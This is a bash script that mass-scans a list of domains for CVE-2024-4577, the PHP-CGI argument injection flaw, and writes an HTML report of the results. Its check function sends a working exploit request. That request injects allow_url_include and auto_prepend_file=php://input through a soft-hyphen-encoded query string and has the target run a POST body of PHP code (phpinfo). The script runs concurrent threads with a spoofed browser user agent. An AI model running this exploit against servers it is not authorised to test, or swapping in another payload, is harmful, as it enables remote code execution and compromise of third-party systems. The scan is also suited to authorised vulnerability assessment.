#!/bin/bash



# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Global variables
TIMEOUT=10
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
LOG_FILE="vulnerability_scan_$(date +%Y%m%d_%H%M%S).log"
REPORT_FILE="vulnerability_report_$(date +%Y%m%d_%H%M%S).html"
THREADS=10
FILE=""
INTERACTIVE=0

# Function to check for required dependencies
check_dependencies() {
    if ! command -v curl &> /dev/null; then
        echo -e "${RED}Error: curl is not installed. Please install curl and try again.${NC}"
        exit 1
    fi
}

# Function to check vulnerability for a domain
check_vulnerability() {
    local domain=$1
    local response
    response=$(curl -s -X POST "${domain}/test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
        -H "User-Agent: $USER_AGENT" \
        -H "Accept: */*" \
        -H "Content-Length: 23" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Connection: keep-alive" \
        --data "<?php phpinfo(); ?>" \
        --max-time "$TIMEOUT" 2>/dev/null)

    if [[ "$response" == *"PHP Version"* ]]; then
        echo -e "[${RED}VULNERABLE${NC}] $domain"
        echo "$domain: Vulnerable" >> "$LOG_FILE"
        echo "<tr><td>$domain</td><td class='vulnerable'>Vulnerable</td></tr>" >> "$REPORT_FILE"
    elif [[ -z "$response" ]]; then
        echo -e "[${YELLOW}TIMEOUT${NC}   ] $domain"
        echo "$domain: Connection timed out" >> "$LOG_FILE"
        echo "<tr><td>$domain</td><td class='timeout'>Connection timed out</td></tr>" >> "$REPORT_FILE"
    else
        echo -e "[${GREEN}SAFE${NC}      ] $domain"
        echo "$domain: Not vulnerable" >> "$LOG_FILE"
        echo "<tr><td>$domain</td><td class='not-vulnerable'>Not vulnerable</td></tr>" >> "$REPORT_FILE"
    fi
}

# Function to initialize the HTML report
initialize_report() {
    cat << EOF > "$REPORT_FILE"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CVE-2024-4577 Vulnerability Scan Report</title>
    <style>
        body { font-family: Arial, sans-serif; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; }
        th { background-color: #f2f2f2; }
        .vulnerable { background-color: #ffcccb; }
        .not-vulnerable { background-color: #90ee90; }
        .timeout { background-color: #ffffe0; }
    </style>
</head>
<body>
    <h1>CVE-2024-4577 Vulnerability Scan Report</h1>
    <p>Scan conducted on $(date)</p>
    <table>
        <tr>
            <th>Domain</th>
            <th>Status</th>
        </tr>
EOF
}

# Function to finalize the HTML report
finalize_report() {
    local total=$1
    local vulnerable=$2
    local not_vulnerable=$3
    local timed_out=$4

    cat << EOF >> "$REPORT_FILE"
    </table>
    <h2>Summary</h2>
    <p>Total domains scanned: $total</p>
    <p>Vulnerable: $vulnerable</p>
    <p>Not vulnerable: $not_vulnerable</p>
    <p>Timed out: $timed_out</p>
</body>
</html>
EOF
}

# Main function to iterate over domains
main() {
    local total_domains
    local vulnerable
    local not_vulnerable 
    local timed_out 

    local file=$1
    total_domains=$(wc -l < "$file")

    initialize_report

    echo -e "\n${YELLOW}[*] Starting CVE-2024-4577 vulnerability scan${NC}"
    echo -e "${BLUE}[*] Total domains to scan: $total_domains${NC}"
    echo -e "${BLUE}[*] Scan started at $(date)${NC}\n"

    # Process domains
    local count=0
    while IFS= read -r domain || [[ -n "$domain" ]]; do
        ((count++))
        check_vulnerability "$domain" &
        if ((count % THREADS == 0)); then
            wait
        fi
    done < "$file"
    wait

    vulnerable=$(grep -c "Vulnerable" "$LOG_FILE")
    not_vulnerable=$(grep -c "Not vulnerable" "$LOG_FILE")
    timed_out=$(grep -c "Connection timed out" "$LOG_FILE")

    finalize_report "$total_domains" "$vulnerable" "$not_vulnerable" "$timed_out"

    echo -e "\n${BLUE}[*] Scan completed at $(date)${NC}"
    echo -e "${BLUE}[*] Scan Results:${NC}"
    echo -e "    ${GREEN}Safe:${NC}       $not_vulnerable"
    echo -e "    ${RED}Vulnerable:${NC} $vulnerable"
    echo -e "    ${YELLOW}Timed out:${NC}  $timed_out"
    echo -e "\n${BLUE}[*] Detailed log saved to: $LOG_FILE${NC}"
    echo -e "${BLUE}[*] HTML report saved to: $REPORT_FILE${NC}"
}

# Function for interactive mode
interactive_mode() {
    local temp_file

    echo -e "${BLUE}[*] Enter domains to check (one per line). Press Ctrl+D when finished:${NC}"
    temp_file=$(mktemp)
    cat > "$temp_file"
    main "$temp_file"
    rm "$temp_file"
}

# Function to display help message
show_help() {
    echo -e "${YELLOW}Usage: $0 [-f file] [-t threads] [-u user_agent] [-i] [-h]${NC}"
    echo "  -f file        File containing list of domains to check"
    echo "  -t threads     Number of concurrent threads (default: 10)"
    echo "  -u user_agent  Custom User-Agent string"
    echo "  -i             Interactive mode"
    echo "  -h             Display this help message"
}

# Parse command-line arguments
while getopts ":f:t:u:ih" opt; do
    case ${opt} in
        f )
            FILE=$OPTARG
            ;;
        t )
            THREADS=$OPTARG
            ;;
        u )
            USER_AGENT=$OPTARG
            ;;
        i )
            INTERACTIVE=1
            ;;
        h )
            show_help
            exit 0
            ;;
        \? )
            echo -e "${RED}Error: Invalid option -$OPTARG${NC}" >&2
            show_help
            exit 1
            ;;
        : )
            echo -e "${RED}Error: Option -$OPTARG requires an argument${NC}" >&2
            show_help
            exit 1
            ;;
    esac
done

# Check dependencies
check_dependencies

# Main execution logic
if [[ $INTERACTIVE -eq 1 ]]; then
    interactive_mode
elif [[ -n $FILE ]]; then
    if [[ ! -f $FILE ]]; then
        echo -e "${RED}Error: File '$FILE' not found.${NC}" >&2
        exit 1
    fi
    main "$FILE"
else
    show_help
    exit 1
fi
